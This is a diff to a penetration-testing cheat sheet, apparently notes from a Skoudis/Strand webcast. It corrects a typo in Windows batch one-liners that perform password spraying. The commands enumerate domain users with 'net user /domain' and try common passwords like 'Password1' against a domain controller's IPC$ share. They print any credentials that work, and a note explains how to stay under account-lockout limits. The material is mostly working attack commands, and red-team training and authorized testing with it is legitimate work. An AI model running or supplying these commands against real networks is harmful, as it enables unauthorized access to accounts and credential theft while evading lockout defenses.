@@ -38,14 +38,14 @@ This section taken from Skoudis / Strand Pillage the Village redux webcast
     * Locally - `net user /domain > users`
 
 ### Simple `for` loop to try one or two passwords across all the users on the domain
- * **Command with arguments**: `@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\[DOMAINCONTROLLER]\IPC$ /user:[DOMAIN]\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use / delete \\[DOMAINCONTROLLER]\IPC$ > NUL`
+ * **Command with arguments**: `@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\[DOMAINCONTROLLER]\IPC$ /user:[DOMAIN]\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\[DOMAINCONTROLLER]\IPC$ > NUL`
  * **Formatted for readability:
 ```
 @FOR /F %n in (users.txt) DO
  @FOR / F %p in (pass.txt) DO
   @net use \\[DOMAINCONTROLLER]\IPC$ /user:[DOMAIN]\%n %p 1>NUL 2>&1 &&
    @echo [*] %n:%p &&
-    @net use / delete \\[DOMAINCONTROLLER]IPC$ > NULL
+    @net use /delete \\[DOMAINCONTROLLER]IPC$ > NULL
 ```
  * **Description**: a for loop that iterated over all the users in `users.txt` and tries all the passwords listed in `pass.txt`. Can be used with the `net user /domain` command listed above for every user in the domain.
  *  **Note**: To prevent account lockout, the amount of passwords in `pass.txt` should be kept very small--one or two at most.
@@ -54,7 +54,7 @@ This section taken from Skoudis / Strand Pillage the Village redux webcast
        * `net user /domain > DomainUsers.txt`
         * `echo "Password1" >> pass.txt`
         * `echo "1q2w3e4r" >> pass.txt`
-        * `@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use / delete \\COMPANYDC1\IPC$ > NUL`
+        * `@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL`
 
 # Tools
 
